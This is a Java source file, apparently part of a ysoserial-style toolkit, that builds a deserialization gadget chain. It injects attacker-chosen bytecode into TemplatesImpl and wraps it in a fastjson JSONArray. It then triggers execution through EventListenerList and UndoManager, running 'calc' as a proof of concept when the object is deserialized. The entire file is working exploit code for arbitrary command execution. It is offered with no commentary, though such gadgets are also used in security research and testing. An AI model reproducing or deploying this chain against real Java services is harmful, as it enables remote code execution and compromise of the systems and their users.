package com.sec.cwm.base.ysoserial;

import com.alibaba.fastjson.*;
import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Vector;
import javax.swing.event.EventListenerList;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import 	javax.swing.undo.UndoManager;
import javax.sql.rowset.serial.SQLInputImpl;
public class FastjsonwithNewtoString {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Object createTemplateImpl(String command) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("cwm");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        cc.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, cc);
        constructor.setBody(command);
        cc.addConstructor(constructor);
        byte[][] bytes=new byte[][]{cc.toBytecode()};
        setFieldValue(templates, "_bytecodes", bytes);
        setFieldValue(templates, "_name", "cwm");
        setFieldValue(templates, "_tfactory", null);
        return  templates;
    }
    public static Object oldToString(Object triggee) throws Exception {
        BadAttributeValueExpException val=new BadAttributeValueExpException(null);
        Field valfield=val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, triggee);
        return val;
    }
    public static Object newToString(Object triggee) throws Exception {
        EventListenerList list=new EventListenerList();
        UndoManager um=new UndoManager();
        Vector v=(Vector) getFieldValue(um,"edits");
        v.add(triggee);
        setFieldValue(list,"listenerList",new Object[]{InternalError.class,um});
        return list;
    }
//    public static Object newToString2(Object triggee) throws Exception {
//        SQLInputImpl sqlInput=new SQLInputImpl(null,null);
//        return formatter;
//    }

    public static void main(String[] args) throws Exception {
        JSONArray jsonArray=new JSONArray();
        jsonArray.add(createTemplateImpl("Runtime.getRuntime().exec(\"calc\");"));
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
//        oos.writeObject(oldToString(jsonArray));
        oos.writeObject(newToString(jsonArray));
//        oos.writeObject(newToString2(jsonArray));
        oos.close();
        ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        Object obj=ois.readObject();
    }

}
